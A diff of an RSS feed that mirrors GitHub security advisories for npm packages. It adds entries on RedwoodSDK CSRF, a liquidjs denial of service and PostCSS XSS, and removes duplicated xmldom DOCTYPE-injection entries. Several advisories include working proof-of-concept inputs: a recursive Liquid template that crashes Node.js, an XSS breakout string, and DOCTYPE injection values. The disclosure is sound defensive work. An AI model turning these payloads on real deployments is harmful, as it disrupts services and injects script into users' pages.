@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-04-24T15:19:07.084Z</updated>
+    <updated>2026-04-24T16:13:53.482Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,161 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[rwsdk] RedwoodSDK has Same-site CSRF through lack of origin validation in its server actions]]></title>
+        <id>https://github.com/advisories/GHSA-m2m6-cff5-3w7c</id>
+        <link href="https://github.com/advisories/GHSA-m2m6-cff5-3w7c"/>
+        <updated>2026-04-24T15:36:54.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Server actions in <code>rwsdk</code> apply HTTP method enforcement but no origin validation. A request originating from a different origin that the browser treats as same-site can invoke a server action with the victim's session cookie attached.</p>
+<h3 id="impact">Impact</h3>
+<p>An attacker who controls any origin the browser considers same-site with the deployed app can induce an authenticated victim's browser to invoke arbitrary server actions. The exposure depends on deployment shape:</p>
+<ul>
+<li>Apps deployed on custom domains (for example <code>app.example.com</code>) are exposed whenever the attacker controls any sibling subdomain under the same registrable domain. Plausible vectors include subdomain takeover of stale DNS records pointing at third-party services, cross-site scripting on a sibling application, or content served from a user-content subdomain.</li>
+<li>Apps deployed on platform-suffix domains on the Public Suffix List (<code>*.workers.dev</code>, <code>*.pages.dev</code>) are not exposed to the sibling-subdomain vector, because sibling subdomains under those suffixes are treated as cross-site.</li>
+<li>In local development, <code>localhost</code> on any other port is treated as same-site with the app's dev server. A separate process running on the developer's machine can invoke server actions against the dev server.</li>
+</ul>
+<p>The attacker cannot read action responses (<code>mode: "no-cors"</code> yields opaque responses). Impact is therefore limited to side effects of action invocation: writes, state changes, and any externally observable action the application performs in response.</p>
+<p>Cross-site requests from unrelated origins (<code>evil.com</code> targeting <code>app.com</code>) are not affected because <code>SameSite=Lax</code> session cookies are not attached by default in that scenario.</p>
+<h3 id="affected-configurations">Affected Configurations</h3>
+<p>Applications using <code>rwsdk</code> server actions (<code>serverAction()</code> or functions invoked via the RSC action protocol) in combination with cookie-based authentication. <code>serverQuery()</code> is not affected because it is designed to be idempotent and is invoked via GET.</p>
+<h3 id="patch">Patch</h3>
+<p>The patched release enforces an Origin/Host match for non-GET action requests. Requests whose <code>Origin</code> header does not match the request's own origin are rejected with HTTP 403 unless the origin is listed in a new <code>allowedOrigins</code> configuration option.</p>
+<p>No application code changes are required for apps that invoke server actions from their own origin. Apps that legitimately invoke server actions from another origin must add those origins to the <code>allowedOrigins</code> option on <code>defineApp</code>.</p>
+<h3 id="credits">Credits</h3>
+<p>Reported by <code>@mthx</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/redwoodjs/sdk/security/advisories/GHSA-m2m6-cff5-3w7c">https://github.com/redwoodjs/sdk/security/advisories/GHSA-m2m6-cff5-3w7c</a></li>
+<li><a href="https://github.com/advisories/GHSA-m2m6-cff5-3w7c">https://github.com/advisories/GHSA-m2m6-cff5-3w7c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m2m6-cff5-3w7c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-24T15:36:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[liquidjs] liquidjs has a Denial of Service via circular block reference in layout]]></title>
+        <id>https://github.com/advisories/GHSA-4rc3-7j7w-m548</id>
+        <link href="https://github.com/advisories/GHSA-4rc3-7j7w-m548"/>
+        <updated>2026-04-24T15:34:04.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A circular block reference in <code>{% layout %}</code> / <code>{% block %}</code> causes an infinite recursive loop, consuming all available memory (~4GB) and crashing the Node.js process with <code>FATAL ERROR: JavaScript heap out of memory</code>. This allows any user who can submit a Liquid template to perform a Denial of Service attack.</p>
+<h3 id="details">Details</h3>
+<p>In <code>src/tags/block.ts</code>, during OUTPUT mode, each block looks up its render function from <code>ctx.getRegister('blocks')[this.block]</code>. When a block with name <code>a</code> is nested inside another block also named <code>a</code> in a child template, the inner block finds the outer block's render function and calls it. The outer block's templates contain the inner block again, creating infinite recursion with no termination condition.</p>
+<p>Relevant code (<code>src/tags/block.ts</code>, <code>getBlockRender</code> method):</p>
+<pre><code class="language-typescript">private getBlockRender (ctx: Context) {
+  const { liquid, templates } = this
+  const renderChild = ctx.getRegister('blocks')[this.block]
+  const renderCurrent = function * (superBlock: BlockDrop, emitter: Emitter) {
+    ctx.push({ block: superBlock })
+    yield liquid.renderer.renderTemplates(templates, ctx, emitter)
+    ctx.pop()
+  }
+  return renderChild
+    ? (superBlock: BlockDrop, emitter: Emitter) =&gt; renderChild(
+        new BlockDrop(
+          (emitter: Emitter) =&gt; renderCurrent(superBlock, emitter)
+        ),
+        emitter)
+    : renderCurrent
+}
+</code></pre>
+<p>When <code>renderChild</code> exists (same-name block found), it calls <code>renderChild</code> which re-renders templates containing the nested block, which again finds <code>renderChild</code>, and so on — infinite loop.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>1. Create a layout file</strong> (<code>layout.html</code>):</p>
+<pre><code class="language-liquid">&lt;header&gt;{% block a %}default-a{% endblock %}&lt;/header&gt;
+&lt;main&gt;{% block b %}default-b{% endblock %}&lt;/main&gt;
+&lt;footer&gt;{% block c %}default-c{% endblock %}&lt;/footer&gt;
+</code></pre>
+<p><strong>2. Create a template that uses the layout:</strong></p>
+<pre><code class="language-liquid">{% layout "layout" %}
+{% block a %}outer-a {% block a %}inner-a{% endblock %}{% endblock %}
+{% block b %}content-b{% endblock %}
+{% block c %}content-c{% endblock %}
+</code></pre>
+<p><strong>3. Render:</strong></p>
+<pre><code class="language-javascript">const { Liquid } = require('liquidjs')
+const liquid = new Liquid({ root: './', extname: '.html' })
+liquid.renderFile('template').then(console.log)
+// Result: process hangs, memory grows to ~4GB, then crashes with OOM
+</code></pre>
+<p>The anonymous block variant also triggers the same issue:</p>
+<pre><code class="language-liquid">{% layout "parent" %}
+{%block%}A{%block%}B{%endblock%}{%endblock%}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p><strong>Denial of Service (DoS).</strong> Any application that accepts user-provided or user-influenced Liquid templates — such as CMS platforms, email template builders, multi-tenant SaaS products, or static site generators with untrusted input — can be crashed by a single malicious template. The attack requires no authentication beyond the ability to submit a template, and no special configuration. The Node.js process is killed by the OS due to memory exhaustion, causing complete service disruption.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-4rc3-7j7w-m548">https://github.com/harttle/liquidjs/security/advisories/GHSA-4rc3-7j7w-m548</a></li>
+<li><a href="https://github.com/harttle/liquidjs/commit/e2311dfd6e82f73509308aa8a3a1fafc92e226f0">https://github.com/harttle/liquidjs/commit/e2311dfd6e82f73509308aa8a3a1fafc92e226f0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4rc3-7j7w-m548">https://github.com/advisories/GHSA-4rc3-7j7w-m548</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4rc3-7j7w-m548</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-24T15:34:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[postcss] PostCSS has XSS via Unescaped </style> in its CSS Stringify Output]]></title>
+        <id>https://github.com/advisories/GHSA-qx2v-qp2m-jg93</id>
+        <link href="https://github.com/advisories/GHSA-qx2v-qp2m-jg93"/>
+        <updated>2026-04-24T15:31:44.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="postcss-xss-via-unescaped-style-in-css-stringify-output">PostCSS: XSS via Unescaped <code>&lt;/style&gt;</code> in CSS Stringify Output</h1>
+<h2 id="summary">Summary</h2>
+<p>PostCSS v8.5.5 (latest) does not escape <code>&lt;/style&gt;</code> sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML <code>&lt;style&gt;</code> tags, <code>&lt;/style&gt;</code> in CSS values breaks out of the style context, enabling XSS.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-javascript">const postcss = require('postcss');
+
+// Parse user CSS and re-stringify for page embedding
+const userCSS = 'body { content: "&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;"; }';
+const ast = postcss.parse(userCSS);
+const output = ast.toResult().css;
+const html = `&lt;style&gt;${output}&lt;/style&gt;`;
+
+console.log(html);
+// &lt;style&gt;body { content: "&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;"; }&lt;/style&gt;
+//
+// Browser: &lt;/style&gt; closes the style tag, &lt;script&gt; executes
+</code></pre>
+<p><strong>Tested output</strong> (Node.js v22, postcss v8.5.5):</p>
+<pre><code>Input: body { content: "&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;"; }
+Output: body { content: "&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;"; }
+Contains &lt;/style&gt;: true
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Impact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Escape <code>&lt;/style</code> in all stringified output values:</p>
+<pre><code class="language-javascript">output = output.replace(/&lt;\/(style)/gi, '&lt;\\/$1');
+</code></pre>
+<h2 id="credits">Credits</h2>
+<p>Discovered and reported by <a href="https://tharvid.in">Sunil Kumar</a> (<a href="https://github.com/TharVid">@TharVid</a>)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93">https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41305">https://nvd.nist.gov/vuln/detail/CVE-2026-41305</a></li>
+<li><a href="https://github.com/postcss/postcss/releases/tag/8.5.10">https://github.com/postcss/postcss/releases/tag/8.5.10</a></li>
+<li><a href="https://github.com/advisories/GHSA-qx2v-qp2m-jg93">https://github.com/advisories/GHSA-qx2v-qp2m-jg93</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qx2v-qp2m-jg93</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-24T15:31:42.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@astrojs/cloudflare] Cloudflare has SSRF via redirect following through its image-binding-transform endpoint (incomplete fix for GHSA-qpr4)]]></title>
         <id>https://github.com/advisories/GHSA-88gm-j2wx-58h6</id>
@@ -1824,578 +1979,5 @@ document is enough.</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-22T20:23:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[xmldom] xmldom has XML injection through unvalidated DocumentType serialization]]></title>
-        <id>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</id>
-        <link href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h"/>
-        <updated>2026-04-22T20:19:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The package serializes <code>DocumentType</code> node fields (<code>internalSubset</code>, <code>publicId</code>, <code>systemId</code>) verbatim
-without any escaping or validation. When these fields are set programmatically to attacker-controlled
-strings, <code>XMLSerializer.serializeToString</code> can produce output where the DOCTYPE declaration is
-terminated early and arbitrary markup appears outside it.</p>
-<hr>
-<h2 id="details">Details</h2>
-<p><code>DOMImplementation.createDocumentType(qualifiedName, publicId, systemId, internalSubset)</code> validates
-only <code>qualifiedName</code> against the XML QName production. The remaining three arguments are stored
-as-is with no validation.</p>
-<p>The XMLSerializer emits <code>DocumentType</code> nodes as:</p>
-<pre><code>&lt;!DOCTYPE name[ PUBLIC pubid][ SYSTEM sysid][ [internalSubset]]&gt;
-</code></pre>
-<p>All fields are pushed into the output buffer verbatim — no escaping, no quoting added.</p>
-<p><strong><code>internalSubset</code> injection:</strong> The serializer wraps <code>internalSubset</code> with <code> [</code> and <code>]</code>. A value
-containing <code>]&gt;</code> closes the internal subset and the DOCTYPE declaration at the injection point.
-Any content after <code>]&gt;</code> in <code>internalSubset</code> appears outside the DOCTYPE in the serialized output as
-raw XML markup. Reported by @TharVid (GHSA-f6ww-3ggp-fr8h). Affected: <code>@xmldom/xmldom</code> ≥ 0.9.0
-via <code>createDocumentType</code> API; 0.8.x only via direct property write.</p>
-<p><strong><code>publicId</code> injection:</strong> The serializer emits <code>publicId</code> verbatim after <code>PUBLIC</code> with no
-quoting added. A value containing an injected system identifier (e.g.,
-<code>"pubid" SYSTEM "evil"</code>) breaks the intended quoting context, injecting a fake SYSTEM entry
-into the serialized DOCTYPE declaration. Identified during internal security research. Affected:
-both branches, all versions back to 0.1.0.</p>
-<p><strong><code>systemId</code> injection:</strong> The serializer emits <code>systemId</code> verbatim. A value containing <code>&gt;</code>
-terminates the DOCTYPE declaration early; content after <code>&gt;</code> appears as raw XML markup outside
-the DOCTYPE context. Identified during internal security research. Affected: both branches, all
-versions back to 0.1.0.</p>
-<p>The parse path is safe: the SAX parser enforces the <code>PubidLiteral</code> and <code>SystemLiteral</code> grammar
-productions, which exclude the relevant characters, and the internal subset parser only accepts a
-subset it can structurally validate. The vulnerability is reachable only through programmatic
-<code>createDocumentType</code> calls with attacker-controlled arguments.</p>
-<hr>
-<h2 id="affected-code">Affected code</h2>
-<p><strong><code>lib/dom.js</code> — <code>createDocumentType</code> (lines 898–910):</strong></p>
-<pre><code class="language-js">createDocumentType: function (qualifiedName, publicId, systemId, internalSubset) {
-    validateQualifiedName(qualifiedName);          // only qualifiedName is validated
-    var node = new DocumentType(PDC);
-    node.name = qualifiedName;
-    node.nodeName = qualifiedName;
-    node.publicId = publicId || '';               // stored verbatim
-    node.systemId = systemId || '';               // stored verbatim
-    node.internalSubset = internalSubset || '';   // stored verbatim
-    node.childNodes = new NodeList();
-    return node;
-},
-</code></pre>
-<p><strong><code>lib/dom.js</code> — serializer DOCTYPE case (lines 2948–2964):</strong></p>
-<pre><code class="language-js">case DOCUMENT_TYPE_NODE:
-    var pubid = node.publicId;
-    var sysid = node.systemId;
-    buf.push(g.DOCTYPE_DECL_START, ' ', node.name);
-    if (pubid) {
-        buf.push(' ', g.PUBLIC, ' ', pubid);
-        if (sysid &amp;&amp; sysid !== '.') {
-            buf.push(' ', sysid);
-        }
-    } else if (sysid &amp;&amp; sysid !== '.') {
-        buf.push(' ', g.SYSTEM, ' ', sysid);
-    }
-    if (node.internalSubset) {
-        buf.push(' [', node.internalSubset, ']');  // internalSubset emitted verbatim
-    }
-    buf.push('&gt;');
-    return;
-</code></pre>
-<hr>
-<h2 id="poc">PoC</h2>
-<h3 id="internalsubset-injection">internalSubset injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '',
-    ']&gt;&lt;injected/&gt;&lt;![CDATA['
-);
-const doc = impl.createDocument(null, 'root', doctype);
-const xml = new XMLSerializer().serializeToString(doc);
-console.log(xml);
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-//                   ^^^^^^^^^^  injected element outside DOCTYPE
-</code></pre>
-<h3 id="publicid-quoting-context-break">publicId quoting context break</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '"injected PUBLIC_ID" SYSTEM "evil"',
-    '',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root PUBLIC "injected PUBLIC_ID" SYSTEM "evil"&gt;&lt;root/&gt;
-// quoting context broken — SYSTEM entry injected
-</code></pre>
-<h3 id="systemid-injection">systemId injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '"sysid"&gt;&lt;injected attr="pwn"/&gt;',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root SYSTEM "sysid"&gt;&lt;injected attr="pwn"/&gt;&gt;&lt;root/&gt;
-// &gt; in sysid closes DOCTYPE early; &lt;injected/&gt; appears as sibling element
-</code></pre>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>An application that programmatically constructs <code>DocumentType</code> nodes from user-controlled data and
-then serializes the document can emit a DOCTYPE declaration where the internal subset is closed
-early or where injected SYSTEM entities or other declarations appear in the serialized output.</p>
-<p>Downstream XML parsers that re-parse the serialized output and expand entities from the injected
-DOCTYPE declarations may be susceptible to XXE-class attacks if they enable entity expansion.</p>
-<hr>
-<h2 id="fix-applied">Fix Applied</h2>
-<blockquote>
-<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
-vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
-untrusted data to <code>createDocumentType()</code> or write untrusted values directly to a
-<code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> properties should audit
-all <code>serializeToString()</code> call sites and add the option.</p>
-</blockquote>
-<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer validates the <code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, and <code>internalSubset</code> fields before emitting the DOCTYPE declaration and throws <code>InvalidStateError</code> if any field contains an injection sequence:</p>
-<ul>
-<li><strong><code>publicId</code></strong>: throws if non-empty and does not match the XML <code>PubidLiteral</code> production (XML 1.0 [12])</li>
-<li><strong><code>systemId</code></strong>: throws if non-empty and does not match the XML <code>SystemLiteral</code> production (XML 1.0 [11])</li>
-<li><strong><code>internalSubset</code></strong>: throws if it contains <code>]&gt;</code> (which closes the internal subset and DOCTYPE declaration early)</li>
-</ul>
-<p>All three checks apply regardless of how the invalid value entered the node — whether via <code>createDocumentType</code> arguments or a subsequent direct property write.</p>
-<h3 id="poc--fixed-path">PoC — fixed path</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-const impl = new DOMImplementation();
-
-// internalSubset injection
-const dt1 = impl.createDocumentType('root', '', '', ']&gt;&lt;injected/&gt;&lt;![CDATA[');
-const doc1 = impl.createDocument(null, 'root', dt1);
-
-// Default (unchanged): verbatim — injection present
-console.log(new XMLSerializer().serializeToString(doc1));
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-
-// Opt-in guard: throws InvalidStateError
-try {
-  new XMLSerializer().serializeToString(doc1, { requireWellFormed: true });
-} catch (e) {
-  console.log(e.name, e.message);
-  // InvalidStateError: DocumentType internalSubset contains "]&gt;"
-}
-</code></pre>
-<p>The guard also covers post-creation property writes:</p>
-<pre><code class="language-js">const dt2 = impl.createDocumentType('root', '', '');
-dt2.systemId = '"sysid"&gt;&lt;injected attr="pwn"/&gt;';
-const doc2 = impl.createDocument(null, 'root', dt2);
-new XMLSerializer().serializeToString(doc2, { requireWellFormed: true });
-// InvalidStateError: DocumentType systemId is not a valid SystemLiteral
-</code></pre>
-<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
-<p>The W3C DOM Parsing and Serialization spec §3.2.1.3 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec permits verbatim serialization of DOCTYPE fields. Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
-<h3 id="residual-limitation">Residual limitation</h3>
-<p><code>createDocumentType(qualifiedName, publicId, systemId[, internalSubset])</code> does not validate <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> at creation time. This creation-time validation is a breaking change and is deferred to a future breaking release.</p>
-<p>When the default serialization path is used (without <code>requireWellFormed: true</code>), all three fields are still emitted verbatim. Applications that do not pass <code>requireWellFormed: true</code> remain exposed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-<li><a href="https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314">https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-22T20:19:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom has XML injection through unvalidated DocumentType serialization]]></title>
-        <id>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</id>
-        <link href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h"/>
-        <updated>2026-04-22T20:19:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The package serializes <code>DocumentType</code> node fields (<code>internalSubset</code>, <code>publicId</code>, <code>systemId</code>) verbatim
-without any escaping or validation. When these fields are set programmatically to attacker-controlled
-strings, <code>XMLSerializer.serializeToString</code> can produce output where the DOCTYPE declaration is
-terminated early and arbitrary markup appears outside it.</p>
-<hr>
-<h2 id="details">Details</h2>
-<p><code>DOMImplementation.createDocumentType(qualifiedName, publicId, systemId, internalSubset)</code> validates
-only <code>qualifiedName</code> against the XML QName production. The remaining three arguments are stored
-as-is with no validation.</p>
-<p>The XMLSerializer emits <code>DocumentType</code> nodes as:</p>
-<pre><code>&lt;!DOCTYPE name[ PUBLIC pubid][ SYSTEM sysid][ [internalSubset]]&gt;
-</code></pre>
-<p>All fields are pushed into the output buffer verbatim — no escaping, no quoting added.</p>
-<p><strong><code>internalSubset</code> injection:</strong> The serializer wraps <code>internalSubset</code> with <code> [</code> and <code>]</code>. A value
-containing <code>]&gt;</code> closes the internal subset and the DOCTYPE declaration at the injection point.
-Any content after <code>]&gt;</code> in <code>internalSubset</code> appears outside the DOCTYPE in the serialized output as
-raw XML markup. Reported by @TharVid (GHSA-f6ww-3ggp-fr8h). Affected: <code>@xmldom/xmldom</code> ≥ 0.9.0
-via <code>createDocumentType</code> API; 0.8.x only via direct property write.</p>
-<p><strong><code>publicId</code> injection:</strong> The serializer emits <code>publicId</code> verbatim after <code>PUBLIC</code> with no
-quoting added. A value containing an injected system identifier (e.g.,
-<code>"pubid" SYSTEM "evil"</code>) breaks the intended quoting context, injecting a fake SYSTEM entry
-into the serialized DOCTYPE declaration. Identified during internal security research. Affected:
-both branches, all versions back to 0.1.0.</p>
-<p><strong><code>systemId</code> injection:</strong> The serializer emits <code>systemId</code> verbatim. A value containing <code>&gt;</code>
-terminates the DOCTYPE declaration early; content after <code>&gt;</code> appears as raw XML markup outside
-the DOCTYPE context. Identified during internal security research. Affected: both branches, all
-versions back to 0.1.0.</p>
-<p>The parse path is safe: the SAX parser enforces the <code>PubidLiteral</code> and <code>SystemLiteral</code> grammar
-productions, which exclude the relevant characters, and the internal subset parser only accepts a
-subset it can structurally validate. The vulnerability is reachable only through programmatic
-<code>createDocumentType</code> calls with attacker-controlled arguments.</p>
-<hr>
-<h2 id="affected-code">Affected code</h2>
-<p><strong><code>lib/dom.js</code> — <code>createDocumentType</code> (lines 898–910):</strong></p>
-<pre><code class="language-js">createDocumentType: function (qualifiedName, publicId, systemId, internalSubset) {
-    validateQualifiedName(qualifiedName);          // only qualifiedName is validated
-    var node = new DocumentType(PDC);
-    node.name = qualifiedName;
-    node.nodeName = qualifiedName;
-    node.publicId = publicId || '';               // stored verbatim
-    node.systemId = systemId || '';               // stored verbatim
-    node.internalSubset = internalSubset || '';   // stored verbatim
-    node.childNodes = new NodeList();
-    return node;
-},
-</code></pre>
-<p><strong><code>lib/dom.js</code> — serializer DOCTYPE case (lines 2948–2964):</strong></p>
-<pre><code class="language-js">case DOCUMENT_TYPE_NODE:
-    var pubid = node.publicId;
-    var sysid = node.systemId;
-    buf.push(g.DOCTYPE_DECL_START, ' ', node.name);
-    if (pubid) {
-        buf.push(' ', g.PUBLIC, ' ', pubid);
-        if (sysid &amp;&amp; sysid !== '.') {
-            buf.push(' ', sysid);
-        }
-    } else if (sysid &amp;&amp; sysid !== '.') {
-        buf.push(' ', g.SYSTEM, ' ', sysid);
-    }
-    if (node.internalSubset) {
-        buf.push(' [', node.internalSubset, ']');  // internalSubset emitted verbatim
-    }
-    buf.push('&gt;');
-    return;
-</code></pre>
-<hr>
-<h2 id="poc">PoC</h2>
-<h3 id="internalsubset-injection">internalSubset injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '',
-    ']&gt;&lt;injected/&gt;&lt;![CDATA['
-);
-const doc = impl.createDocument(null, 'root', doctype);
-const xml = new XMLSerializer().serializeToString(doc);
-console.log(xml);
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-//                   ^^^^^^^^^^  injected element outside DOCTYPE
-</code></pre>
-<h3 id="publicid-quoting-context-break">publicId quoting context break</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '"injected PUBLIC_ID" SYSTEM "evil"',
-    '',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root PUBLIC "injected PUBLIC_ID" SYSTEM "evil"&gt;&lt;root/&gt;
-// quoting context broken — SYSTEM entry injected
-</code></pre>
-<h3 id="systemid-injection">systemId injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '"sysid"&gt;&lt;injected attr="pwn"/&gt;',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root SYSTEM "sysid"&gt;&lt;injected attr="pwn"/&gt;&gt;&lt;root/&gt;
-// &gt; in sysid closes DOCTYPE early; &lt;injected/&gt; appears as sibling element
-</code></pre>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>An application that programmatically constructs <code>DocumentType</code> nodes from user-controlled data and
-then serializes the document can emit a DOCTYPE declaration where the internal subset is closed
-early or where injected SYSTEM entities or other declarations appear in the serialized output.</p>
-<p>Downstream XML parsers that re-parse the serialized output and expand entities from the injected
-DOCTYPE declarations may be susceptible to XXE-class attacks if they enable entity expansion.</p>
-<hr>
-<h2 id="fix-applied">Fix Applied</h2>
-<blockquote>
-<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
-vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
-untrusted data to <code>createDocumentType()</code> or write untrusted values directly to a
-<code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> properties should audit
-all <code>serializeToString()</code> call sites and add the option.</p>
-</blockquote>
-<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer validates the <code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, and <code>internalSubset</code> fields before emitting the DOCTYPE declaration and throws <code>InvalidStateError</code> if any field contains an injection sequence:</p>
-<ul>
-<li><strong><code>publicId</code></strong>: throws if non-empty and does not match the XML <code>PubidLiteral</code> production (XML 1.0 [12])</li>
-<li><strong><code>systemId</code></strong>: throws if non-empty and does not match the XML <code>SystemLiteral</code> production (XML 1.0 [11])</li>
-<li><strong><code>internalSubset</code></strong>: throws if it contains <code>]&gt;</code> (which closes the internal subset and DOCTYPE declaration early)</li>
-</ul>
-<p>All three checks apply regardless of how the invalid value entered the node — whether via <code>createDocumentType</code> arguments or a subsequent direct property write.</p>
-<h3 id="poc--fixed-path">PoC — fixed path</h3>
